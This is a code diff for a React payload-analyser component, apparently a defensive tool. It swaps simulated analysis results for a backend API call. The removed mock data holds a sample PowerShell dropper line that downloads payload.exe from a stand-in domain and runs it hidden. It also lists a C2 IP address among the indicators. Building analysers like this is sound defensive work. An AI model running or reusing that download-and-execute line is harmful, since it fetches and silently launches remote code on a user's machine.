@@ -1,3 +1,4 @@
+import { API_BASE_URL } from '../config';
 import React, { useState } from 'react';
 import { Terminal, Code, Cpu, RefreshCw, FileCode, Search, ShieldAlert } from 'lucide-react';
 
@@ -6,26 +7,24 @@ export const PayloadAnalyzer: React.FC = () => {
   const [isAnalyzing, setIsAnalyzing] = useState(false);
   const [results, setResults] = useState<any>(null);
 
-  const handleAnalyze = () => {
+  const handleAnalyze = async () => {
     if (!payload.trim()) return;
     
     setIsAnalyzing(true);
-    // Simulate LLM processing
-    setTimeout(() => {
-      setResults({
-        language: 'PowerShell',
-        obfuscation: 'Base64 + Gzip + Variable Renaming',
-        intent: 'Download and Execute (Dropper)',
-        iocs: [
-          { type: 'IPv4', value: '185.158.248.10', context: 'C2 Server' },
-          { type: 'Domain', value: 'update-windows-service.com', context: 'Payload Host' },
-          { type: 'File', value: 'payload.exe', context: 'Dropped Executable' }
-        ],
-        deobfuscatedCode: `Invoke-WebRequest -Uri "http://update-windows-service.com/payload.exe" -OutFile "$env:TEMP\\payload.exe"\nStart-Process "$env:TEMP\\payload.exe" -WindowStyle Hidden`,
-        explanation: 'This script is a common PowerShell dropper. It reaches out to a remote server to download an executable named "payload.exe" into the user\'s TEMP directory, and then executes it silently in the background.'
+    try {
+      const res = await fetch(`${API_BASE_URL}/api/analyze-payload`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ payload })
       });
+      const data = await res.json();
+      setResults(data);
+    } catch (e) {
+      console.error(e);
+      setResults(null);
+    } finally {
       setIsAnalyzing(false);
-    }, 2000);
+    }
   };
 
   const decodeBase64 = () => {
